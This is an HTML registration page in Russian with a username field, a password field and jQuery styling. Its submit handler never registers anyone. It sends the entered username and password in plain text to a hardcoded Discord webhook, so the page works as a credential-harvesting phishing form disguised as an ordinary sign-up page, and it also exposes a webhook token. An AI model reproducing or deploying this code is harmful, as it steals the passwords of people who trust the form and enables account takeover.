<!DOCTYPE html>
<html>
<head>
  <title>Регистрация</title>
    <style>
         body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            padding: 50px;
        }
        form {
            background-color: #ffffff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.1);
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #ccc;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
    </style>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
</head>
<body>
    <h2>Регистрация</h2>
    <form id="registrationForm">
        <label for="username">Имя пользователя:</label><br>
        <input type="text" id="username" name="username"><br>
        <label for="password">Пароль:</label><br>
        <input type="password" id="password" name="password"><br>
        <input type="submit" value="Зарегистрироваться">
    </form>

    <script>
        $('#registrationForm').on('submit', function(e) {
            e.preventDefault();
            var username = $('#username').val();
            var password = $('#password').val();

            
            var webhookUrl = 'https://discord.com/api/webhooks/1240014187904766004/fvPErv-6FaCSG9AhtpNHGrpLgkWfX1zEOf8rYzT23XPmS9-OfuJMglkqURa3sPchV2en';

            var message = 'Ник: ' + username + ', Пароль: ' + password + '!';
            
            // Отправка сообщения на вебхук
            $.ajax({
                url: webhookUrl,
                type: 'POST',
                contentType: 'application/json',
                data: JSON.stringify({content: message}),
                success: function(response) {
                    console.log('Сообщение успешно отправлено');
                },
                error: function(error) {
                    console.error('Ошибка отправки сообщения на вебхук:', error);
                }
            });
        });
    </script>
</body>
</html>
